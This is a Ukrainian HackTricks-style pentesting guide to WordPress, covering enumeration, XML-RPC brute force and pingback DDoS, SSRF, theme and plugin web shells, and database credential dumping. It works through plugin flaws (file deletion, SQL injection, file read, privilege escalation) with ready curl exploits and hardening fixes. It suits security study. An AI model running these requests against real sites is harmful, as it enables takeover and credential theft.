# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

- **Завантажені** файли знаходяться за адресою: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Файли тем можна знайти в /wp-content/themes/,** тому якщо ви зміните деякі php файли теми для отримання RCE, ви, напевно, будете використовувати цей шлях. Наприклад: Використовуючи **тему twentytwelve**, ви можете **доступитися** до файлу **404.php** за адресою: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Ще одна корисна URL-адреса може бути:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- У **wp-config.php** ви можете знайти кореневий пароль бази даних.
- Шляхи для входу за замовчуванням для перевірки: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Основні файли WordPress**

- `index.php`
- `license.txt` містить корисну інформацію, таку як версія встановленого WordPress.
- `wp-activate.php` використовується для процесу активації електронної пошти при налаштуванні нового сайту WordPress.
- Папки для входу (можуть бути перейменовані для приховування):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` - це файл, який представляє функцію WordPress, що дозволяє передавати дані з HTTP, що діє як механізм транспорту, а XML - як механізм кодування. Цей тип зв'язку був замінений на [REST API](https://developer.wordpress.org/rest-api/reference) WordPress.
- Папка `wp-content` є основним каталогом, де зберігаються плагіни та теми.
- `wp-content/uploads/` - це каталог, де зберігаються всі файли, завантажені на платформу.
- `wp-includes/` - це каталог, де зберігаються основні файли, такі як сертифікати, шрифти, JavaScript файли та віджети.
- `wp-sitemap.xml` У версіях WordPress 5.5 і вище WordPress генерує XML файл карти сайту з усіма публічними постами та публічно запитуваними типами постів і таксономіями.

**Пост експлуатація**

- Файл `wp-config.php` містить інформацію, необхідну WordPress для підключення до бази даних, таку як ім'я бази даних, хост бази даних, ім'я користувача та пароль, ключі аутентифікації та солі, а також префікс таблиці бази даних. Цей конфігураційний файл також може бути використаний для активації режиму DEBUG, що може бути корисним для усунення неполадок.

### Дозволи користувачів

- **Адміністратор**
- **Редактор**: Публікує та керує своїми та чужими постами
- **Автор**: Публікує та керує своїми постами
- **Співробітник**: Пише та керує своїми постами, але не може їх публікувати
- **Підписник**: Переглядає пости та редагує свій профіль

## **Пасивна енумерація**

### **Отримати версію WordPress**

Перевірте, чи можете ви знайти файли `/license.txt` або `/readme.html`

У **джерельному коді** сторінки (приклад з [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS посилання файли

![](<../../images/image (533).png>)

- JavaScript файли

### Отримати плагіни
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Отримати теми
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Витяг версій загалом
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Активна енумерація

### Плагіни та Теми

Ви, напевно, не зможете знайти всі можливі Плагіни та Теми. Щоб виявити їх усі, вам потрібно буде **активно Брутфорсити список Плагінів та Тем** (на щастя, для нас є автоматизовані інструменти, які містять ці списки).

### Користувачі

- **ID Брут:** Ви отримуєте дійсних користувачів з сайту WordPress, Брутфорсуючи ID користувачів:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Якщо відповіді **200** або **30X**, це означає, що id є **дійсним**. Якщо відповідь **400**, тоді id є **недійсним**.

- **wp-json:** Ви також можете спробувати отримати інформацію про користувачів, запитуючи:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Ще один `/wp-json/` кінцевий пункт, який може розкрити деяку інформацію про користувачів, це:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Зверніть увагу, що цей кінцевий пункт лише відкриває користувачів, які зробили пост. **Будуть надані лише відомості про користувачів, у яких активована ця функція**.

Також зверніть увагу, що **/wp-json/wp/v2/pages** може витікати IP-адреси.

- **Перерахування імен користувачів для входу**: Коли ви входите в **`/wp-login.php`**, **повідомлення** є **іншим**, якщо вказане **ім'я користувача існує чи ні**.

### XML-RPC

Якщо `xml-rpc.php` активний, ви можете виконати брутфорс облікових даних або використовувати його для запуску DoS-атак на інші ресурси. (Ви можете автоматизувати цей процес[ використовуючи це](https://github.com/relarizky/wpxploit), наприклад).

Щоб перевірити, чи активний, спробуйте отримати доступ до _**/xmlrpc.php**_ і надішліть цей запит:

**Перевірити**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Брутфорс облікових даних**

**`wp.getUserBlogs`**, **`wp.getCategories`** або **`metaWeblog.getUsersBlogs`** — це деякі з методів, які можна використовувати для брутфорсу облікових даних. Якщо ви зможете знайти будь-який з них, ви можете надіслати щось на зразок:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Повідомлення _"Неправильне ім'я користувача або пароль"_ всередині відповіді з кодом 200 повинно з'явитися, якщо облікові дані недійсні.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Використовуючи правильні облікові дані, ви можете завантажити файл. У відповіді з'явиться шлях ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Також є **швидший спосіб** для брутфорсу облікових даних, використовуючи **`system.multicall`**, оскільки ви можете спробувати кілька облікових даних в одному запиті:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Обхід 2FA**

Цей метод призначений для програм, а не для людей, і є старим, тому не підтримує 2FA. Отже, якщо у вас є дійсні облікові дані, але головний вхід захищений 2FA, **ви можете зловживати xmlrpc.php, щоб увійти з цими обліковими даними, обминаючи 2FA**. Зверніть увагу, що ви не зможете виконати всі дії, які можна виконати через консоль, але ви все ще можете отримати доступ до RCE, як пояснює Ippsec у [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS або сканування портів**

Якщо ви можете знайти метод _**pingback.ping**_ у списку, ви можете змусити Wordpress надіслати довільний запит до будь-якого хоста/порту.\
Це можна використовувати, щоб попросити **тисячі** сайтів **Wordpress** **доступитися** до одного **місця** (так що в цьому місці викликано **DDoS**) або ви можете використовувати це, щоб змусити **Wordpress** **сканувати** якусь внутрішню **мережу** (ви можете вказати будь-який порт).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Якщо ви отримали **faultCode** зі значенням **більше** ніж **0** (17), це означає, що порт відкритий.

Подивіться на використання **`system.multicall`** в попередньому розділі, щоб дізнатися, як зловживати цим методом для виклику DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Цей файл зазвичай існує в кореневій директорії сайту Wordpress: **`/wp-cron.php`**\
Коли цей файл **доступний**, виконується "**важкий**" MySQL **запит**, тому його можуть використовувати **зловмисники** для **виклику** **DoS**.\
Також, за замовчуванням, `wp-cron.php` викликається при кожному завантаженні сторінки (кожного разу, коли клієнт запитує будь-яку сторінку Wordpress), що на сайтах з високим трафіком може викликати проблеми (DoS).

Рекомендується вимкнути Wp-Cron і створити реальний cronjob на хостингу, який виконує необхідні дії з регулярним інтервалом (без виклику проблем).

### /wp-json/oembed/1.0/proxy - SSRF

Спробуйте отримати доступ до _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ і сайт Worpress може надіслати запит до вас.

Ось відповідь, коли це не працює:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Цей інструмент перевіряє, чи існує **methodName: pingback.ping** для шляху **/wp-json/oembed/1.0/proxy** і, якщо існує, намагається їх експлуатувати.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Отримання доступу шляхом перезапису біта

Більше ніж реальна атака, це цікавість. У CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ви могли перевернути 1 біт з будь-якого файлу wordpress. Тож ви могли перевернути позицію `5389` файлу `/var/www/html/wp-includes/user.php`, щоб NOP операцію NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Зміна php з теми, що використовується (потрібні облікові дані адміністратора)**

Зовнішній вигляд → Редактор тем → Шаблон 404 (праворуч)

Змініть вміст на php shell:

![](<../../images/image (384).png>)

Шукайте в інтернеті, як ви можете отримати доступ до оновленої сторінки. У цьому випадку вам потрібно перейти сюди: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Ви можете використовувати:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP плагін

Можливо, що можна завантажити .php файли як плагін.\
Створіть свій php бекдор, використовуючи, наприклад:

![](<../../images/image (183).png>)

Потім додайте новий плагін:

![](<../../images/image (722).png>)

Завантажте плагін і натисніть Встановити зараз:

![](<../../images/image (249).png>)

Натисніть Продовжити:

![](<../../images/image (70).png>)

Ймовірно, це нічого не зробить на перший погляд, але якщо ви перейдете до Медіа, ви побачите завантажену оболонку:

![](<../../images/image (462).png>)

Доступ до неї, і ви побачите URL для виконання реверсної оболонки:

![](<../../images/image (1006).png>)

### Завантаження та активація шкідливого плагіна

Цей метод передбачає установку шкідливого плагіна, відомого як вразливий, який можна експлуатувати для отримання веб-оболонки. Цей процес здійснюється через панель управління WordPress наступним чином:

1. **Отримання плагіна**: Плагін отримується з джерела, такого як Exploit DB, як [**тут**](https://www.exploit-db.com/exploits/36374).
2. **Встановлення плагіна**:
- Перейдіть до панелі управління WordPress, потім перейдіть до `Панель управління > Плагіни > Завантажити плагін`.
- Завантажте zip-файл завантаженого плагіна.
3. **Активація плагіна**: Після успішної установки плагін потрібно активувати через панель управління.
4. **Експлуатація**:
- З встановленим і активованим плагіном "reflex-gallery" його можна експлуатувати, оскільки відомо, що він вразливий.
- Фреймворк Metasploit надає експлойт для цієї вразливості. Завантаживши відповідний модуль і виконавши специфічні команди, можна встановити сесію meterpreter, що надає несанкціонований доступ до сайту.
- Зазначено, що це лише один з багатьох методів експлуатації сайту WordPress.

Контент включає візуальні допоміжні засоби, що ілюструють кроки в панелі управління WordPress для встановлення та активації плагіна. Однак важливо зазначити, що експлуатація вразливостей таким чином є незаконною та неетичною без належного дозволу. Цю інформацію слід використовувати відповідально і лише в законному контексті, наприклад, під час тестування на проникнення з явним дозволом.

**Для більш детальних кроків перевірте:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Від XSS до RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ — це скрипт, призначений для ескалації вразливості **Cross-Site Scripting (XSS)** до **Remote Code Execution (RCE)** або інших критичних вразливостей у WordPress. Для отримання додаткової інформації перевірте [**цей пост**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Він надає **підтримку для версій WordPress 6.X.X, 5.X.X та 4.X.X і дозволяє:**
- _**Ескалація привілеїв:**_ Створює користувача в WordPress.
- _**(RCE) Завантаження користувацького плагіна (бекдору):**_ Завантажте свій користувацький плагін (бекдор) до WordPress.
- _**(RCE) Редагування вбудованого плагіна:**_ Редагуйте вбудовані плагіни в WordPress.
- _**(RCE) Редагування вбудованої теми:**_ Редагуйте вбудовані теми в WordPress.
- _**(Користувацький) Користувацькі експлойти:**_ Користувацькі експлойти для сторонніх плагінів/тем WordPress.

## Постексплуатація

Витягніть імена користувачів та паролі:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Змінити пароль адміністратора:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Знання того, як плагін Wordpress може відкривати функціональність, є ключовим для виявлення вразливостей у його функціональності. Ви можете знайти, як плагін може відкривати функціональність, у наступних пунктах та деяких прикладах вразливих плагінів у [**цьому блозі**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Один із способів, яким плагін може відкривати функції для використання, - це через AJAX обробники. Ці обробники можуть містити логіку, помилки авторизації або аутентифікації. Більше того, досить часто ці функції базують як аутентифікацію, так і авторизацію на існуванні nonce Wordpress, який **будь-який користувач, що аутентифікований у екземплярі Wordpress, може мати** (незалежно від його ролі).

Це функції, які можуть бути використані для відкриття функції в плагіні:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Використання `nopriv` робить кінцеву точку доступною для будь-яких користувачів (навіть неавтентифікованих).**

> [!CAUTION]
> Більше того, якщо функція просто перевіряє авторизацію користувача за допомогою функції `wp_verify_nonce`, ця функція просто перевіряє, чи увійшов користувач, зазвичай не перевіряючи роль користувача. Тому користувачі з низькими привілеями можуть мати доступ до дій з високими привілеями.

- **REST API**

Також можливо експонувати функції з WordPress, реєструючи REST API за допомогою функції `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` — це зворотний виклик функції, яка перевіряє, чи має даний користувач право викликати метод API.

**Якщо використовується вбудована функція `__return_true`, вона просто пропустить перевірку прав користувача.**

- **Прямий доступ до php файлу**

Звичайно, Wordpress використовує PHP, і файли всередині плагінів безпосередньо доступні з вебу. Отже, якщо плагін відкриває будь-яку вразливу функціональність, яка активується просто доступом до файлу, це буде експлуатовано будь-яким користувачем.

### Неавтентифіковане довільне видалення файлів через wp_ajax_nopriv (Тема Litho <= 3.0)

Теми та плагіни WordPress часто відкривають AJAX обробники через хуки `wp_ajax_` та `wp_ajax_nopriv_`. Коли використовується варіант **_nopriv_**, **зворотний виклик стає доступним для неавтентифікованих відвідувачів**, тому будь-яка чутлива дія повинна додатково реалізовувати:

1. **перевірку можливостей** (наприклад, `current_user_can()` або принаймні `is_user_logged_in()`), і
2. **CSRF nonce**, перевірений за допомогою `check_ajax_referer()` / `wp_verify_nonce()`, і
3. **Сувору санітизацію / валідацію введення**.

Тема Litho (мультифункціональна) (< 3.1) забула ці 3 контролі в функції *Видалити сімейство шрифтів* і в результаті відправила наступний код (спрощений):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Проблеми, які виникають через цей фрагмент:

* **Неавтентифікований доступ** – хук `wp_ajax_nopriv_` зареєстровано.
* **Відсутня перевірка nonce / можливостей** – будь-який відвідувач може звернутися до кінцевої точки.
* **Відсутня санітизація шляху** – рядок `fontfamily`, контрольований користувачем, конкатенується до шляху файлової системи без фільтрації, що дозволяє класичний `../../` обхід.

#### Експлуатація

Зловмисник може видалити будь-який файл або директорію **нижче базового каталогу завантажень** (зазвичай `<wp-root>/wp-content/uploads/`), надіславши один HTTP POST запит:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Оскільки `wp-config.php` знаходиться поза *uploads*, чотири послідовності `../` достатні для стандартної установки. Видалення `wp-config.php` змушує WordPress перейти до *майстра установки* під час наступного відвідування, що дозволяє повністю захопити сайт (зловмисник просто надає нову конфігурацію БД і створює адміністратора).

Інші важливі цілі включають файли плагінів/тем `.php` (для зламу плагінів безпеки) або правила `.htaccess`.

#### Перелік для виявлення

* Будь-який `add_action( 'wp_ajax_nopriv_...')` зворотний виклик, який викликає допоміжні функції файлової системи (`copy()`, `unlink()`, `$wp_filesystem->delete()`, тощо).
* Конкатенація неочищеного вводу користувача в шляхи (шукайте `$_POST`, `$_GET`, `$_REQUEST`).
* Відсутність `check_ajax_referer()` та `current_user_can()`/`is_user_logged_in()`.

#### Посилення
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Завжди** розглядайте будь-яку операцію запису/видалення на диску як привілейовану та двічі перевіряйте:
> • Аутентифікація  • Авторизація  • Нонсе  • Санітизація введення  • Обмеження шляху (наприклад, через `realpath()` плюс `str_starts_with()`).

---

### Підвищення привілеїв через відновлення застарілої ролі та відсутню авторизацію (ASE "Перегляд адміністратора як ролі")

Багато плагінів реалізують функцію "перегляд як роль" або тимчасового перемикання ролей, зберігаючи оригінальну роль(і) в метаданих користувача, щоб їх можна було відновити пізніше. Якщо шлях відновлення покладається лише на параметри запиту (наприклад, `$_REQUEST['reset-for']`) та список, що підтримується плагіном, без перевірки можливостей та дійсного нонсу, це призводить до вертикального підвищення привілеїв.

Приклад з реального світу був знайдений у плагіні Admin and Site Enhancements (ASE) (≤ 7.6.2.1). Гілка скидання відновлювала ролі на основі `reset-for=<username>`, якщо ім'я користувача з'являлося в внутрішньому масиві `$options['viewing_admin_as_role_are']`, але не виконувала перевірку `current_user_can()` або перевірку нонсу перед видаленням поточних ролей і повторним додаванням збережених ролей з метаданих користувача `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Чому це вразливо

- Довіряє `$_REQUEST['reset-for']` та опції плагіна без авторизації на стороні сервера.
- Якщо користувач раніше мав вищі привілеї, збережені в `_asenha_view_admin_as_original_roles`, і був понижений, він може відновити їх, натиснувши на шлях скидання.
- У деяких розгортаннях будь-який автентифікований користувач міг би ініціювати скидання для іншого імені користувача, яке все ще присутнє в `viewing_admin_as_role_are` (порушена авторизація).

Передумови атаки

- Вразлива версія плагіна з увімкненою функцією.
- Цільовий обліковий запис має застарілу роль з високими привілеями, збережену в метаданих користувача з попереднього використання.
- Будь-яка автентифікована сесія; відсутній nonce/можливість у процесі скидання.

Експлуатація (приклад)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
На вразливих збірках це видаляє поточні ролі та повторно додає збережені оригінальні ролі (наприклад, `administrator`), ефективно підвищуючи привілеї.

Список перевірки виявлення

- Шукайте функції перемикання ролей, які зберігають “оригінальні ролі” в метаданих користувача (наприклад, `_asenha_view_admin_as_original_roles`).
- Визначте шляхи скидання/відновлення, які:
  - Читають імена користувачів з `$_REQUEST` / `$_GET` / `$_POST`.
  - Модифікують ролі через `add_role()` / `remove_role()` без `current_user_can()` та `wp_verify_nonce()` / `check_admin_referer()`.
  - Авторизують на основі масиву параметрів плагіна (наприклад, `viewing_admin_as_role_are`) замість можливостей актора.

Ускладнення

- Застосовуйте перевірки можливостей на кожному гілці, що змінює стан (наприклад, `current_user_can('manage_options')` або більш суворо).
- Вимагайте нонси для всіх мутацій ролей/дозволів та перевіряйте їх: `check_admin_referer()` / `wp_verify_nonce()`.
- Ніколи не довіряйте іменам користувачів, наданим запитом; визначайте цільового користувача на стороні сервера на основі автентифікованого актора та явної політики.
- Скасовуйте стан “оригінальних ролей” при оновленнях профілю/ролі, щоб уникнути застарілого відновлення високих привілеїв:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Розгляньте можливість зберігання мінімального стану та використання токенів з обмеженим часом дії та захистом можливостей для тимчасових перемикань ролей.

---

## Захист WordPress

### Регулярні оновлення

Переконайтеся, що WordPress, плагіни та теми оновлені. Також підтверджуйте, що автоматичне оновлення увімкнене у wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Також, **встановлюйте лише надійні плагіни та теми WordPress**.

### Плагіни безпеки

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Інші рекомендації**

- Видаліть стандартного **admin** користувача
- Використовуйте **сильні паролі** та **2FA**
- Періодично **переглядайте** права **доступу** користувачів
- **Обмежте спроби входу** для запобігання атакам Brute Force
- Перейменуйте файл **`wp-admin.php`** і дозволяйте доступ лише внутрішньо або з певних IP-адрес.

### Неавтентифікований SQL-ін'єкція через недостатню валідацію (WP Job Portal <= 2.3.2)

Плагін рекрутингу WP Job Portal відкрив задачу **savecategory**, яка в кінцевому підсумку виконує наступний вразливий код всередині `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Проблеми, які виникають через цей фрагмент:

1. **Несанітизований ввід користувача** – `parentid` надходить безпосередньо з HTTP-запиту.
2. **Конкатенація рядків у WHERE-клаузі** – немає `is_numeric()` / `esc_sql()` / підготовленого запиту.
3. **Несанкціонована досяжність** – хоча дія виконується через `admin-post.php`, єдиною перевіркою є **CSRF nonce** (`wp_verify_nonce()`), який будь-який відвідувач може отримати з публічної сторінки, що вбудовує шорткод `[wpjobportal_my_resumes]`.

#### Експлуатація

1. Отримайте новий nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Впровадьте довільний SQL, зловживаючи `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Відповідь розкриває результат впровадженого запиту або змінює базу даних, що підтверджує SQLi.


### Несанкціоноване завантаження довільних файлів / Перехід по шляху (WP Job Portal <= 2.3.2)

Інше завдання, **downloadcustomfile**, дозволяло відвідувачам завантажувати **будь-який файл на диску** через перехід по шляху. Вразливий приймач розташований у `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` контролюється атакуючим і конкатенується **без санітизації**. Знову ж таки, єдиним бар'єром є **CSRF nonce**, який можна отримати зі сторінки резюме.

#### Використання
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Сервер відповідає вмістом `wp-config.php`, витікаючи облікові дані БД та ключі автентифікації.

## Посилання

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)

{{#include ../../banners/hacktricks-training.md}}
